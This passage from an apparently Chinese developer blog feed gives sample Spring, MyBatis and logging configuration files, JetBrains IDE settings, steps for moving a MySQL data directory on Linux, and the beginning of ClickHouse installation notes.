&lt;version&gt;3.2.0&lt;/version&gt;            &lt;executions&gt;                &lt;execution&gt;                    &lt;id&gt;copy-config-file&lt;/id&gt;                    &lt;phase&gt;process-resources&lt;/phase&gt;                    &lt;goals&gt;                        &lt;goal&gt;copy-resources&lt;/goal&gt;                    &lt;/goals&gt;                    &lt;configuration&gt;                        &lt;outputDirectory&gt;$&#123;basedir&#125;/target/config/&lt;/outputDirectory&gt;                        &lt;resources&gt;                            &lt;resource&gt;                                &lt;directory&gt;$&#123;basedir&#125;/src/main/resources/&lt;/directory&gt;                                &lt;includes&gt;                                    &lt;include&gt;*.properties&lt;/include&gt;                                    &lt;include&gt;*.xml&lt;/include&gt;                                    &lt;include&gt;*.yml&lt;/include&gt;                                    &lt;include&gt;*.yaml&lt;/include&gt;                                    &lt;include&gt;*.config&lt;/include&gt;                                &lt;/includes&gt;                            &lt;/resource&gt;                        &lt;/resources&gt;                    &lt;/configuration&gt;                &lt;/execution&gt;            &lt;/executions&gt;        &lt;/plugin&gt;    &lt;/plugins&gt;&lt;/build&gt;</code></pre><h2 id="2、springboot"><a href="#2、springboot" class="headerlink" title="2、springboot"></a>2、springboot</h2><pre><code class="yaml">server:  port: 8888spring:  resources:    static-locations: classpath:/static,classpath:/public,classpath:/resources,classpath:/META-INF/resources  mvc:    static-path-pattern: /resources/*.html  datasource:    # database    driver-class-name: com.mysql.cj.jdbc.Driver    url: jdbc:mysql://localhost:3306/flinkcdc?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=true&amp;serverTimezone=GMT%2B8&amp;rewriteBatchedStatements=true    username: root    password: root    type: com.alibaba.druid.pool.DruidDataSource    # druid    druid:      max-wait: 60000 # 最大等待时间，配置获取连接等待超时，时间单位都是毫秒ms      max-active: 3 # 最大活跃连接      min-idle: 1 # 最小空闲连接      initial-size: 1 # 初始化大小      min-evictable-idle-time-millis: 60000 # 配置一个连接在池中最小生存的时间      time-between-eviction-runs-millis: 300000 # 配置间隔多久才进行一次检测，检测需要关闭的空闲连接      test-on-borrow: false      test-on-return: false      test-while-idle: true      pool-prepared-statements: true      max-pool-prepared-statement-per-connection-size: 20 # 最大PSCache连接      use-global-data-source-stat: true      connection-properties: druid.stat.mergeSql=true;druid.stat.slowSqlMillis=500 # 通过connectProperties属性来打开mergeSql功能；慢SQL记录      filter: # 配置监控统计拦截的filters，去掉后监控界面sql无法统计        stat:          enabled: true        wall: # wall用于防火墙          enabled: true        log4j2:          enabled: true      web-stat-filter: # 配置StatFilter        enabled: true # 默认为false，设置为true启动        exclusions: &quot;*.js,*.gif,*.jpg,*.bmp,*.png,*.css,*.ico,/druid/*&quot;      stat-view-servlet: # 配置StatViewServlet        enabled: true        url-pattern: &quot;/druid/*&quot;        allow: localhost # ip白名单        deny: 192.168.141.141 # ip黑名单        login-username: root # 账号密码        login-password: root        reset-enable: true # 是否可以重置  kafka:    bootstrap-servers: 192.168.141.141:9092,192.168.141.142:9092,192.168.141.143:9092    producer:      retries: 3 # 发送失败时，重试的次数      batch-size: 16384 # 批量发送时的大小，byte，默认16k      buffer-memory: 33554432 # 缓冲区大小，byte，默认32M      acks: 1 # 生产者确定服务器接收消息的策略    consumer:      group-id: default-group # 组id      enable-auto-commit: false # 自动提交      auto-offset-reset: earliest      max-poll-records: 10 # 批量提取提取时，一次性提取的大小# mybatismybatis:  mapper-locations: classpath:mybatis/mapper/*.xml  type-aliases-package: net.yury.pojo---# 开发环境spring:  profiles: devmysql:  ipPort: localhost:3306---# 测试环境spring:  profiles: testmysql:  ipPort: 192.168.141.141:3306---# 生产环境spring:  profiles: prodmysql:  ipPort: xxxx:xxxx# 启动时指定对应环境：java -jar test.jar --spring.profiles.active=test</code></pre><h2 id="2、spring-mybatis"><a href="#2、spring-mybatis" class="headerlink" title="2、spring-mybatis"></a>2、spring-mybatis</h2><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;       xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;       xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;       xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans        https://www.springframework.org/schema/beans/spring-beans.xsd        http://www.springframework.org/schema/context        https://www.springframework.org/schema/context/spring-context.xsd        http://www.springframework.org/schema/tx        https://www.springframework.org/schema/tx/spring-tx.xsd        http://www.springframework.org/schema/aop        https://www.springframework.org/schema/aop/spring-aop.xsd        http://www.springframework.org/schema/mvc        https://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;&gt;    &lt;!-- 1.关联数据库配置文件 --&gt;    &lt;context:property-placeholder location=&quot;classpath:database.properties&quot;/&gt;    &lt;!-- 2.配置数据库连接池 --&gt;    &lt;bean id=&quot;dataSource&quot; class=&quot;com.alibaba.druid.pool.DruidDataSource&quot; destroy-method=&quot;close&quot;&gt;        &lt;!-- 数据库基本信息配置 --&gt;        &lt;property name=&quot;driverClassName&quot; value=&quot;$&#123;jdbc.driver&#125;&quot; /&gt;        &lt;property name=&quot;url&quot; value=&quot;$&#123;jdbc.url&#125;&quot; /&gt;        &lt;property name=&quot;username&quot; value=&quot;$&#123;jdbc.username&#125;&quot; /&gt;        &lt;property name=&quot;password&quot; value=&quot;$&#123;jdbc.password&#125;&quot; /&gt;        &lt;property name=&quot;filters&quot; value=&quot;$&#123;filters&#125;&quot; /&gt;        &lt;!-- 最大并发连接数 --&gt;        &lt;property name=&quot;maxActive&quot; value=&quot;$&#123;maxActive&#125;&quot; /&gt;        &lt;!-- 初始化连接数量 --&gt;        &lt;property name=&quot;initialSize&quot; value=&quot;$&#123;initialSize&#125;&quot; /&gt;        &lt;!-- 配置获取连接等待超时的时间 --&gt;        &lt;property name=&quot;maxWait&quot; value=&quot;$&#123;maxWait&#125;&quot; /&gt;        &lt;!-- 最小空闲连接数 --&gt;        &lt;property name=&quot;minIdle&quot; value=&quot;$&#123;minIdle&#125;&quot; /&gt;        &lt;!-- 配置间隔多久才进行一次检测，检测需要关闭的空闲连接，单位是毫秒 --&gt;        &lt;property name=&quot;timeBetweenEvictionRunsMillis&quot; value=&quot;$&#123;timeBetweenEvictionRunsMillis&#125;&quot; /&gt;        &lt;!-- 配置一个连接在池中最小生存的时间，单位是毫秒 --&gt;        &lt;property name=&quot;minEvictableIdleTimeMillis&quot; value=&quot;$&#123;minEvictableIdleTimeMillis&#125;&quot; /&gt;        &lt;property name=&quot;validationQuery&quot; value=&quot;$&#123;validationQuery&#125;&quot; /&gt;        &lt;property name=&quot;testWhileIdle&quot; value=&quot;$&#123;testWhileIdle&#125;&quot; /&gt;        &lt;property name=&quot;testOnBorrow&quot; value=&quot;$&#123;testOnBorrow&#125;&quot; /&gt;        &lt;property name=&quot;testOnReturn&quot; value=&quot;$&#123;testOnReturn&#125;&quot; /&gt;        &lt;property name=&quot;maxOpenPreparedStatements&quot; value=&quot;$&#123;maxOpenPreparedStatements&#125;&quot; /&gt;        &lt;!-- 打开removeAbandoned功能 --&gt;        &lt;property name=&quot;removeAbandoned&quot; value=&quot;$&#123;removeAbandoned&#125;&quot; /&gt;        &lt;!-- 1800秒，也就是30分钟 --&gt;        &lt;property name=&quot;removeAbandonedTimeout&quot; value=&quot;$&#123;removeAbandonedTimeout&#125;&quot; /&gt;        &lt;!-- 关闭abanded连接时输出错误日志 --&gt;        &lt;property name=&quot;logAbandoned&quot; value=&quot;$&#123;logAbandoned&#125;&quot; /&gt;    &lt;/bean&gt;    &lt;!-- 3.配置sqlSessionFactory --&gt;    &lt;bean id=&quot;sqlSessionFactory&quot; class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt;        &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;/&gt;        &lt;property name=&quot;configLocation&quot; value=&quot;classpath:mybatis-config.xml&quot;/&gt;    &lt;/bean&gt;    &lt;!-- 4.配置dao接口扫描，动态生成接口的实现类（动态代理自动生成，不用自己写实现类），并注入IOC容器中 --&gt;    &lt;bean class=&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;&gt;        &lt;!-- 注入sqlSessionFactory，这里不能用ref，因为他要注入的是一个string，而不是一个sqlSessionFactory对象 --&gt;        &lt;property name=&quot;sqlSessionFactoryBeanName&quot; value=&quot;sqlSessionFactory&quot;/&gt;        &lt;!-- 要扫描的包 --&gt;        &lt;property name=&quot;basePackage&quot; value=&quot;net.yury.dao&quot;/&gt;    &lt;/bean&gt;    &lt;!-- 5.声明式事务管理 --&gt;    &lt;bean id=&quot;transactionManager&quot; class=&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt;        &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;/&gt;    &lt;/bean&gt;    &lt;!-- 6.结合AOP实现事务织入 --&gt;    &lt;!-- 配置事务通知的的类：需要导入tx命名空间 --&gt;    &lt;tx:advice id=&quot;txAdvisor&quot; transaction-manager=&quot;transactionManager&quot;&gt;        &lt;!-- name：给哪些方法配置事务，propagation：配置事务的传播特性 --&gt;        &lt;tx:attributes&gt;            &lt;tx:method name=&quot;add*&quot; propagation=&quot;REQUIRED&quot;/&gt;            &lt;tx:method name=&quot;delete*&quot; propagation=&quot;REQUIRED&quot;/&gt;            &lt;tx:method name=&quot;update*&quot; propagation=&quot;REQUIRED&quot;/&gt;            &lt;tx:method name=&quot;select*&quot; read-only=&quot;true&quot;/&gt;        &lt;/tx:attributes&gt;    &lt;/tx:advice&gt;    &lt;!-- 7.配置事务的切入点 --&gt;    &lt;aop:config&gt;        &lt;aop:pointcut id=&quot;txPointCut&quot; expression=&quot;execution(* net.yury.dao.*.*(..))&quot;/&gt;        &lt;aop:advisor advice-ref=&quot;txAdvisor&quot; pointcut-ref=&quot;txPointCut&quot;/&gt;    &lt;/aop:config&gt;&lt;/beans&gt;</code></pre><h2 id="4、spring-mvc"><a href="#4、spring-mvc" class="headerlink" title="4、spring-mvc"></a>4、spring-mvc</h2><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;       xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;       xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;       xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans        https://www.springframework.org/schema/beans/spring-beans.xsd        http://www.springframework.org/schema/context        https://www.springframework.org/schema/context/spring-context.xsd        http://www.springframework.org/schema/tx        https://www.springframework.org/schema/tx/spring-tx.xsd        http://www.springframework.org/schema/aop        https://www.springframework.org/schema/aop/spring-aop.xsd        http://www.springframework.org/schema/mvc        https://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;&gt;    &lt;!-- 开启映射器和适配器的注解支持 --&gt;    &lt;!-- 并添加Jackson支持，它可以自动把RestController方法返回的对象封装成json字符串，并解决json乱码问题--&gt;    &lt;mvc:annotation-driven&gt;        &lt;mvc:message-converters&gt;            &lt;bean class=&quot;org.springframework.http.converter.StringHttpMessageConverter&quot;&gt;                &lt;constructor-arg value=&quot;UTF-8&quot;/&gt;            &lt;/bean&gt;            &lt;bean class=&quot;org.springframework.http.converter.json.MappingJackson2HttpMessageConverter&quot;&gt;                &lt;property name=&quot;objectMapper&quot;&gt;                    &lt;bean class=&quot;org.springframework.http.converter.json.Jackson2ObjectMapperFactoryBean&quot;&gt;                        &lt;property name=&quot;failOnEmptyBeans&quot; value=&quot;false&quot;/&gt;                    &lt;/bean&gt;                &lt;/property&gt;            &lt;/bean&gt;        &lt;/mvc:message-converters&gt;    &lt;/mvc:annotation-driven&gt;    &lt;!-- 静态资源过滤 --&gt;    &lt;mvc:default-servlet-handler/&gt;    &lt;!-- 扫描包 --&gt;    &lt;context:component-scan base-package=&quot;net.yury.controller&quot;/&gt;    &lt;context:component-scan base-package=&quot;net.yury.service&quot;/&gt;    &lt;!-- 视图解析器 --&gt;    &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;        &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/jsp/&quot;/&gt;        &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;/&gt;    &lt;/bean&gt;    &lt;!-- 登录拦截器 --&gt;    &lt;mvc:interceptors&gt;        &lt;mvc:interceptor&gt;            &lt;mvc:mapping path=&quot;/**&quot;/&gt;            &lt;bean class=&quot;net.yury.interceptor.LoginInterceptor&quot;/&gt;        &lt;/mvc:interceptor&gt;    &lt;/mvc:interceptors&gt;    &lt;!-- 文件上传配置 --&gt;    &lt;bean id=&quot;multipartResolver&quot; class=&quot;org.springframework.web.multipart.commons.CommonsMultipartResolver&quot;&gt;        &lt;!-- 编码 --&gt;        &lt;property name=&quot;defaultEncoding&quot; value=&quot;utf-8&quot;/&gt;        &lt;!-- 最大上传大小，单位为b（字节），10485760b = 10Mb --&gt;        &lt;property name=&quot;maxUploadSize&quot; value=&quot;10485760&quot;/&gt;        &lt;!-- 编码 --&gt;        &lt;property name=&quot;maxInMemorySize&quot; value=&quot;40960&quot;/&gt;    &lt;/bean&gt;&lt;/beans&gt;</code></pre><h2 id="5、log4j2"><a href="#5、log4j2" class="headerlink" title="5、log4j2"></a>5、log4j2</h2><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration status=&quot;info&quot; name=&quot;RoutingTest&quot;&gt;    &lt;Properties&gt;        &lt;Property name=&quot;logFilename&quot;&gt;D:/tmp/test.log&lt;/Property&gt;        &lt;Property name=&quot;filePattern&quot;&gt;D:/tmp/test-%d&#123;MM-dd-yy&#125;-%i.log&lt;/Property&gt;        &lt;Property name=&quot;logPattern&quot;&gt;%d&#123;yyyy-MM-dd HH:mm:ss&#125; [%-5p] [%t] [%l] - %m%n&lt;/Property&gt;    &lt;/Properties&gt;    &lt;ThresholdFilter level=&quot;info&quot;/&gt;    &lt;Appenders&gt;        &lt;Console name=&quot;STDOUT&quot;&gt;            &lt;PatternLayout pattern=&quot;$&#123;logPattern&#125;&quot;/&gt;            &lt;ThresholdFilter level=&quot;info&quot;/&gt;        &lt;/Console&gt;        &lt;Routing name=&quot;Routing&quot;&gt;            &lt;Routes pattern=&quot;$$&#123;sd:type&#125;&quot;&gt;                &lt;Route&gt;                    &lt;RollingFile name=&quot;Rolling-$&#123;sd:type&#125;&quot;                                 fileName=&quot;$&#123;logFilename&#125;&quot;                                 filePattern=&quot;$&#123;filePattern&#125;&quot;&gt;                        &lt;PatternLayout&gt;                            &lt;pattern&gt;$&#123;logPattern&#125;&lt;/pattern&gt;                            &lt;charset&gt;UTF-8&lt;/charset&gt;                        &lt;/PatternLayout&gt;                        &lt;policies&gt;                            &lt;SizeBasedTriggeringPolicy size=&quot;25 MB&quot; /&gt;                            &lt;TimeBasedTriggeringPolicy interval=&quot;1&quot;/&gt;                        &lt;/policies&gt;                    &lt;/RollingFile&gt;                &lt;/Route&gt;                &lt;Route ref=&quot;STDOUT&quot; key=&quot;Audit&quot;/&gt;            &lt;/Routes&gt;        &lt;/Routing&gt;    &lt;/Appenders&gt;    &lt;Loggers&gt;        &lt;Root level=&quot;info&quot;&gt;            &lt;AppenderRef ref=&quot;Routing&quot;/&gt;            &lt;AppenderRef ref=&quot;STDOUT&quot;/&gt;        &lt;/Root&gt;    &lt;/Loggers&gt;&lt;/Configuration&gt;</code></pre><h2 id="6、springboot-logback"><a href="#6、springboot-logback" class="headerlink" title="6、springboot-logback"></a>6、springboot-logback</h2><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;configuration&gt;    &lt;include resource=&quot;org/springframework/boot/logging/logback/defaults.xml&quot;/&gt;    &lt;property name=&quot;LOG_PATH&quot; value=&quot;$&#123;BASE_DIR&#125;/logs&quot;/&gt;    &lt;property name=&quot;LOG_FILE&quot; value=&quot;$&#123;LOG_PATH&#125;/project-name.log&quot;/&gt;    &lt;property name=&quot;LOG_PATTERN&quot; value=&quot;%d&#123;yyyy-MM-dd HH:mm:ss&#125; [%-5p] [%t] [%l] - %m%n&quot;/&gt;    &lt;appender name=&quot;FILE&quot; class=&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt;        &lt;encoder&gt;            &lt;pattern&gt;$&#123;LOG_PATTERN&#125;&lt;/pattern&gt;        &lt;/encoder&gt;        &lt;file&gt;$&#123;LOG_FILE&#125;&lt;/file&gt;        &lt;rollingPolicy class=&quot;ch.qos.logback.core.rolling.SizeAndTimeBasedRollingPolicy&quot;&gt;            &lt;fileNamePattern&gt;$&#123;LOG_FILE&#125;.%d&#123;yyyy-MM-dd&#125;.%i&lt;/fileNamePattern&gt;            &lt;maxFileSize&gt;20MB&lt;/maxFileSize&gt;            &lt;maxHistory&gt;30&lt;/maxHistory&gt;            &lt;totalSizeCap&gt;1GB&lt;/totalSizeCap&gt;        &lt;/rollingPolicy&gt;    &lt;/appender&gt;    &lt;appender name=&quot;CONSOLE&quot; class=&quot;ch.qos.logback.core.ConsoleAppender&quot;&gt;        &lt;encoder&gt;            &lt;pattern&gt;$&#123;LOG_PATTERN&#125;&lt;/pattern&gt;            &lt;charset&gt;utf8&lt;/charset&gt;        &lt;/encoder&gt;    &lt;/appender&gt;    &lt;root level=&quot;INFO&quot;&gt;        &lt;appender-ref ref=&quot;FILE&quot;/&gt;        &lt;appender-ref ref=&quot;CONSOLE&quot;/&gt;    &lt;/root&gt;&lt;/configuration&gt;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、pom&quot;&gt;&lt;a href=&quot;#1、pom&quot; class=&quot;headerlink&quot; title=&quot;1、pom&quot;&gt;&lt;/a&gt;1、pom&lt;/h2&gt;&lt;pre&gt;&lt;code class=&quot;xml&quot;&gt;&amp;lt;properties&amp;gt;
    &amp;lt;maven.compi</summary>
      
    
    
    
    <category term="java" scheme="https://yury757.github.io/categories/java/"/>
    
    
  </entry>
  
  <entry>
    <title>jetbrains系列IDE推荐设置</title>
    <link href="https://yury757.github.io/jetbrains%E7%B3%BB%E5%88%97IDE%E6%8E%A8%E8%8D%90%E8%AE%BE%E7%BD%AE"/>
    <id>https://yury757.github.io/jetbrains%E7%B3%BB%E5%88%97IDE%E6%8E%A8%E8%8D%90%E8%AE%BE%E7%BD%AE</id>
    <published>2021-12-20T16:00:00.000Z</published>
    <updated>2022-01-02T07:00:14.090Z</updated>
    
    <content type="html"><![CDATA[<h2 id="jetbrains系列IDE推荐设置"><a href="#jetbrains系列IDE推荐设置" class="headerlink" title="jetbrains系列IDE推荐设置"></a>jetbrains系列IDE推荐设置</h2><p>1、Editor - Files Encoding，修改为utf-8</p><p>2、Editor - Code Style - 对应语言，设置tab size为4个空格</p><p>3、Editor - Code Style，设置Line Separator为\n</p><p>4、Appearance &amp; Behavior - System Settings，设置取消勾选Reopen projects on startup，并且设置在新窗口打开新项目。</p><p>5、Build, Execution, Deployment - Build Tools - Maven/Gradle，设置自定义的maven设置（仅限java）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;jetbrains系列IDE推荐设置&quot;&gt;&lt;a href=&quot;#jetbrains系列IDE推荐设置&quot; class=&quot;headerlink&quot; title=&quot;jetbrains系列IDE推荐设置&quot;&gt;&lt;/a&gt;jetbrains系列IDE推荐设置&lt;/h2&gt;&lt;p&gt;1、Edit</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>MySQL迁移数据目录</title>
    <link href="https://yury757.github.io/database/mysql/MySQL%E8%BF%81%E7%A7%BB%E6%95%B0%E6%8D%AE%E7%9B%AE%E5%BD%95/MySQL%E8%BF%81%E7%A7%BB%E6%95%B0%E6%8D%AE%E7%9B%AE%E5%BD%95"/>
    <id>https://yury757.github.io/database/mysql/MySQL%E8%BF%81%E7%A7%BB%E6%95%B0%E6%8D%AE%E7%9B%AE%E5%BD%95/MySQL%E8%BF%81%E7%A7%BB%E6%95%B0%E6%8D%AE%E7%9B%AE%E5%BD%95</id>
    <published>2021-12-10T16:00:00.000Z</published>
    <updated>2021-12-11T15:39:17.732Z</updated>
    
    <content type="html"><![CDATA[<p>Linux版本：Ubuntu18.04</p><p>MySQL版本：8.0.26</p><h2 id="1、配置文件"><a href="#1、配置文件" class="headerlink" title="1、配置文件"></a>1、配置文件</h2><p>首先要搞清楚MySQL的配置文件在哪里。</p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/option-files.html">MySQL :: MySQL 8.0 Reference Manual :: 4.2.2.2 Using Option Files</a></p><p>大概意思是，说明了windows和Linux下MySQL读取配置文件的顺序，我们只要找到几个常用配置文件即可。</p><p>windows下的配置文件在：<code>C:\%PROGRAMDIR%\MySQL\MySQL 8.0 Server\my.ini</code>这个文件中。</p><p><code>%PROGRAMDIR%</code>是指windows安装时的数据目录，在中文版本中的windows系统中，这个目录经常是<code>ProgramData</code>，而在英文版本的windows系统中，这个目录经常是<code>Program Files</code>。</p><p>Linux下的配置文件在：<code>/etc/mysql/my.cnf</code>或<code>/etc/mysql/mysql.conf.d/mysqld.cnf</code>（不同MySQL和Linux版本，配置文件不一样）</p><h2 id="2、数据迁移"><a href="#2、数据迁移" class="headerlink" title="2、数据迁移"></a>2、数据迁移</h2><p>找到配置文件后，配置文件中指定了数据目录<code>datadir</code>。</p><p>windows下只要将这个值修改为自己想要的新目录，然后将原数据目录复制过去即可。</p><p>Linux中，同样修改datadir的值，但是复制文件时<font color="Red">一定要注意权限</font>！一般要加上<code>-p</code>。</p><pre><code class="shell">cp -rp /var/lib/mysql/* /disk4/mysql/data/</code></pre><p>此外新目录的创建后也要将这个目录拥有者改成MySQL。</p><pre><code class="shell">chown -R mysql:mysql /disk4/mysql/</code></pre><p>最后，还要修改<font color="Red"><code>/etc/apparmor.d/usr.sbin.mysqld</code></font>这个文件（如果有的话），这个文件限制了Linux系统中某个程序可以访问的目录。如果没有修改这个东西，则会报错：</p><pre><code class="shell">Can&#39;t create test file /disk4/mysql/data/mysqld_tmp_file_case_insensitive_test.lower</code></pre><p>在原来的旧数据目录下加上自己修改的新目录。</p><pre><code class="shell">/disk4/mysql/ r,/disk4/mysql/** rwk,</code></pre><p>重启apparmor</p><pre><code class="shell">/etc/inid.d/apparmor restart</code></pre><p>其中还要一个问题会导致上面说的无法在新目录下创建新文件，即启用了<font color="Red">selinux</font>，将这个东西关闭即可。</p><pre><code class="shell"># 临时关闭selinuxsetenforce 0# 永久关闭selinuxvi /etc/selinux/configSELINUX=disabled</code></pre><h2 id="3、重启"><a href="#3、重启" class="headerlink" title="3、重启"></a>3、重启</h2><pre><code class="shell"># windows 管理员模式下net restart mysql# Linuxsystemctl restart mysql</code></pre><p>Linux下如果重启失败，可以查看报错信息，上面说的配置文件中有一个<code>log-error</code>文件路径，报错信息就在这个文件中。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Linux版本：Ubuntu18.04&lt;/p&gt;
&lt;p&gt;MySQL版本：8.0.26&lt;/p&gt;
&lt;h2 id=&quot;1、配置文件&quot;&gt;&lt;a href=&quot;#1、配置文件&quot; class=&quot;headerlink&quot; title=&quot;1、配置文件&quot;&gt;&lt;/a&gt;1、配置文件&lt;/h2&gt;&lt;p&gt;首先要搞清</summary>
      
    
    
    
    <category term="database" scheme="https://yury757.github.io/categories/database/"/>
    
    
  </entry>
  
  <entry>
    <title>clickhouse</title>
    <link href="https://yury757.github.io/bigdata/clickhouse/clickhouse"/>
    <id>https://yury757.github.io/bigdata/clickhouse/clickhouse</id>
    <published>2021-11-20T16:00:00.000Z</published>
    <updated>2022-01-02T06:53:14.626Z</updated>
    
    <content type="html"><![CDATA[<p>clickhouse版本：21.7.3.14</p><h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><h3 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h3><p>基于<strong>列存储</strong>的数据库，使用C++编写，主要用于<strong>在线分析处理查询</strong>（OLAP），能够使用<strong>SQL查询</strong>实时生成分析报告。</p><p>列式存储的优点：</p><ul><li>对于列的聚合、计数等统计操作由于行式数据库</li><li>由于某一列的数据类型是一样的，在数据压缩上效率更高，压缩比更大，缓存cache也有更大的发挥空间</li></ul><p>列式存储的缺点：插入、更新速度比行式数据库更慢</p><h3 id="2、高吞吐写入能力"><a href="#2、高吞吐写入能力" class="headerlink" title="2、高吞吐写入能力"></a>2、高吞吐写入能力</h3><p>clickhouse采用类<strong>LSM Tree</strong>的结构，数据写入后定期在后台compation。clickhouse在导入数据时全部都是<strong>顺序append写入</strong>，写入后数据段不可更改，在后台compation时也是多个段merge sort后顺序写回磁盘。顺序写的特性，充分利用了磁盘的吞吐能力。</p><h3 id="3、数据分区和线程级并行"><a href="#3、数据分区和线程级并行" class="headerlink" title="3、数据分区和线程级并行"></a>3、数据分区和线程级并行</h3><p>clickhouse将数据划分为多个partition，每个partition再进一步划分为多个index granularity（索引粒度），然后通过多个线程分别处理其中一部分来实现并行数据处理。这种设计下，单条query就可以利用整机所有的CPU资源。对于大量数据的查询也能够化整为零的并行处理。</p><p><font color="Red">缺点：由于一条SQL就会占用所有cpu，因此对于qps高的业务并不适合。</font></p><h3 id="4、使用场景"><a href="#4、使用场景" class="headerlink" title="4、使用场景"></a>4、使用场景</h3><p>不适用于初始数据存储，而适用于最后的宽表存储，用来查询用。</p><p>适用于clickhouse的业务：具有复杂统计逻辑的查询sql，需要查询大量数据的sql，并发量低</p><p>适用于hbase的业务：业务很简单的查询，一般就是key-value一一对应的查询，并发量高</p><p>clickhouse还有一个特点就是，<font color="Red">单表查询速度及其快，但是多表join操作比较慢</font>，在了解join原理后，可以通过优化sql来优化join速度。</p><h2 id="二、安装部署"><a href="#二、安装部署" class="headerlink" title="二、安装部署"></a>二、安装部署</h2><h3 id="1、准备工作"><a href="#1、准备工作" class="headerlink" title="1、准备工作"></a>1、准备工作</h3><h4 id="（1）ulimit"><a href="#（1）ulimit" class="headerlink" title="（1）ulimit"></a>（1）ulimit</h4><p>linux取消一些系统资源限制：</p><pre><code class="shell"># 查看系统资源限制ulimit -a# open files                      (-n) 1024# max user processes              (-u) 7625# 修改系统资源限制sudo vi /etc/security/limits.conf# 加上以下配置* soft nofile 65535* hard nofile 65535* soft nproc  131072* hard nproc  131072# 有些linux系统在/etc/security/limit.d目录下面还有20-npric.conf或90-npric.conf# 这两个配置会把limits.conf配置覆盖了，所以如果有的话这两个也要加上以上配置sudo vi /etc/security/limits.d/20-nproc.conf# 修改之后不需要重启，重新登录该用户即可，再查看ulimit -a是否修改成功</code></pre><h4 id="（2）SELINUX"><a href="#（2）SELINUX" class="headerlink" title="（2）SELINUX"></a>（2）SELINUX</h4><p>sentos取消SELINUX（linux的security enforce）</p><p>SELINUX并不是安装里所有linux都会有，没有SELINUX不需要执行以下修改。</p><pre><code class="shell"># 查看security enforegetenforcesudo vi /etc/selinux/config# 将SELINUX修改为disabledSELINUX=disabled# 重启永久生效，输入以下命令临时生效setenforce 0</code></pre><h4 id="（3）版本"><a href="#（3）版本" class="headerlink" title="（3）版本"></a>（3）版本</h4><p>clickhouse版本更新比较快</p><p>20.6.3 新增explain，类似于MySQL的explain</p><p>20.8 新增同步MySQL功能等</p><p>我们使用的版本是21.7.3.14</p><h3 id="2、下载安装"><a href="#2、下载安装" class="headerlink" title="2、下载安装"></a>2、下载安装</h3><p>下载地址：<a href="https://repo.clickhouse.com/deb/stable/main/">Index of /clickhouse/deb/stable/main/</a></p><pre><code class="shell">cd /home/yury/clickhousewget https://repo.clickhouse.com/deb/stable/main/clickhouse-common-static_21.7.3.14_amd64.debwget https://repo.clickhouse.com/deb/stable/main/clickhouse-client_21.7.3.14_all.debwget https://repo.clickhouse.com/deb/stable/main/clickhouse-server_21.7.3.14_all.deb# 下面这个包是带有调试信息的包，可以不装wget https://repo.clickhouse.com/deb/stable/main/clickhouse-common-static-dbg_21.7.3.14_amd64.debsudo dpkg -i *.deb# 一路yyy，最后要输入一个默认用户的密码，可以设置密码，也可以直接回车不设置密码# 安装成功后，软件被安装到目录下，lib目录在/var/lib/clickhouse/</code></pre><h3 id="3、常用路径"><a href="#3、常用路径" class="headerlink" title="3、常用路径"></a>3、常用路径</h3><p>bin目录：<code>/usr/bin/</code></p><p>服务器安装目录：<code>/etc/clickhouse-server/</code></p><p>客户端安装目录：<code>/etc/clickhouse-client/</code></p><p>配置文件目录：<code>/etc/clickhouse-server/</code>，所有其他配置目录都可以在这个配置文件中设置</p><p>日志目录：<code>/var/log/clickhouse-server/clickhouse-server.log</code></p><p>报错日志目录：<code>/var/log/clickhouse-server/clickhouse-server.err.log</code></p><p>依赖目录：<code>/var/lib/clickhouse/</code></p><p>数据目录：<code>/var/lib/clickhouse/</code>，即config.xml配置文件中path标签下</p><p>临时文件目录：<code>/var/lib/clickhouse/tmp/</code>，即config.xml配置文件中tmp_path标签下</p><h3 id="4、配置"><a href="#4、配置" class="headerlink" title="4、配置"></a>4、配置</h3><p><font color="Red">config.xml中的配置是服务器配置，比如上面说的数据目录、日志目录都在这个配置中，而user.xml则是程序运行参数配置，如cpu、内存在这个里面配置。</font></p><p>config.xml配置文档：<a href="https://clickhouse.com/docs/en/operations/server-configuration-parameters/settings/">Server Settings | ClickHouse 